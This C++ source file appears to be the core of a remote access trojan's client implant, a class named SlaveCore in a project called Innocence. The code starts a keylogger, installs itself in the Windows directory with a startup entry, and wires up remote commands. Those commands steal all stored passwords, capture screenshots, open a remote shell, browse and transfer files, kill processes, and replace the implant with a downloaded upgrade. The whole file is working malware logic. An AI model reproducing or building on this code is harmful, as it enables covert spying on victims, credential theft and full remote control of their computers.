#include <common/Log.hpp>

#include <system/System.hpp>
#include <system/Registry.hpp>
#include <system/Process.hpp>
using namespace System;

#include <Innocence.hpp>
#include <blaspheme/transfer/FileTransfer.hpp>
using namespace Blaspheme;

#include <malicious/Keylogger.hpp>
#include <malicious/Screenshot.hpp>

#include "CommandDispatcher.hpp"
#include "ProgramStart.hpp"
#include "RemoteControlFunctions.hpp"
#include "SlaveCore.hpp"

namespace Inhibition
{
    SlaveCore::SlaveCore(Blaspheme::ConnectionInfo info) : 
		exited(false),
		session(info),
		installPath(System::getWindowsPath() + "\\" + Innocence::INHIBITER_EXE_NAME),
		keylogPath(System::getWindowsPath() + "\\" + Innocence::KEYLOG),
		dllPath(System::getWindowsPath() + "\\" + Innocence::INHIBITION_DLL_NAME),
		startup(installPath)
	{
		setConnection(info);

        // recuperation du chemin d'installation de l'injecteur
        Malicious::Keylogger::instance().setKeylog(keylogPath);
        Malicious::Keylogger::instance().start();
        
        // tous les modules utilisent le meme canal de commande
        SlaveAbstractFunction::setSlave(*this);

        // initialisation des modules
        // on active les modules que le client peut utiliser
        dispatcher.addServerFunction(KILL_CLIENT,           new KillClient);
        dispatcher.addServerFunction(UNINSTALL_CLIENT,      new UninstallClient);
        dispatcher.addServerFunction(GET_LOGFILE,           new SendKeylog);
        dispatcher.addServerFunction(GET_SCREEN,            new SendScreenshot(screenshot));
        dispatcher.addServerFunction(PASSWORDS_GETALL,      new SendPasswords);
        dispatcher.addServerFunction(GET_PROCESSLIST,       new SendProcessList);
        dispatcher.addServerFunction(KILL_PROCESS,          new KillProcess);
        dispatcher.addServerFunction(UPGRADE_CLIENT,        new UpgradeClient);
        dispatcher.addServerFunction(SHUTDOWN,              new Shutdown);
        dispatcher.addServerFunction(REBOOT,                new Reboot);
        dispatcher.addServerFunction(LOGOUT,                new Logout);
        dispatcher.addServerFunction(GET_WINDOWS_VERSION,   new SendWindowsVersion);
        dispatcher.addServerFunction(REBOOT_CLIENT,         new RebootClient);
        dispatcher.addServerFunction(BROWSE_FILES,          new BrowseFileTree);
        dispatcher.addServerFunction(REMOTE_SHELL,          new RemoteShell);
        dispatcher.addServerFunction(START_DOWNLOAD,        new StartDownload);
        dispatcher.addServerFunction(START_UPLOAD,          new StartUpload);
        dispatcher.addServerFunction(GET_CLIENT_NAME,       new SendClientName);
    }

	SlaveCore::~SlaveCore()
	{
		exit();
	}

	Blaspheme::Session& SlaveCore::getSession()
	{
		return session;
	}

    void SlaveCore::exit()
    {
		LOG << "Slave exiting normally";
        exited = true;
    }

	bool SlaveCore::exiting()
	{
		return exited;
	}

    bool SlaveCore::connect()
    {
		return session.connect();
    }

    bool SlaveCore::acquire_stream()
    {
		/*
        TcpClient aux;
        if(aux.connect(cinfo.ip, cinfo.port))
        {
            if(auth.authentificate(aux))
            {
                aux.send(toString(session.get_id())+'\n');
                session.push_stream(aux);
                return true;
            }
            else
            {
                aux.reset();
            }
        }
		*/
        return false;
    }

	const Blaspheme::ConnectionInfo& SlaveCore::getConnection()const
	{
		return session.getConnection();
	}

    void SlaveCore::setConnection(const Blaspheme::ConnectionInfo& info)
    {
		session.setConnection(info);
    }

    const std::string& SlaveCore::getInstallPath()
    {
        return installPath;
    }

    void SlaveCore::disconnect()
    {
        LOG << "Disconnecting";
        // on nettoie a la fois la connexion principale et les connexions auxiliaire
        session.setId(0);
        session.reset();
    }

    bool SlaveCore::process_command()
    {
		LOG_THIS_FUNCTION
		std::string buffer_cmd;
        LOG << "Waiting command";
        session >> buffer_cmd;
        if(dispatcher.find(buffer_cmd))
        {
            LOG << "Command known : " + buffer_cmd;
            dispatcher.dispatch(buffer_cmd);
        }
        else
        {
            LOG << "Command unknown : " + buffer_cmd;
            return false;
        }
        return true;
    }

    bool SlaveCore::uninstall()
    {
        LOG << "Removing registry key";
        startup.uninstall();
        LOG << "Launching uninstaller";
        System::Process::Launcher uninstaller(getInstallPath(), Innocence::UNINSTALL_CMD);		
        exit();
        return true;
    }

    void SlaveCore::upgrade()
    {
        LOG << "Upgrading executable";
        if(!DeleteFile(getInstallPath().c_str()))
        {
            LOG << "DeleteFile failed : "+toString(GetLastError());
            session << FAILURE;
            return;
        }
        session << SUCCESS;
        Download download(getInstallPath(), session.stream());
        download.launch();
    }

}
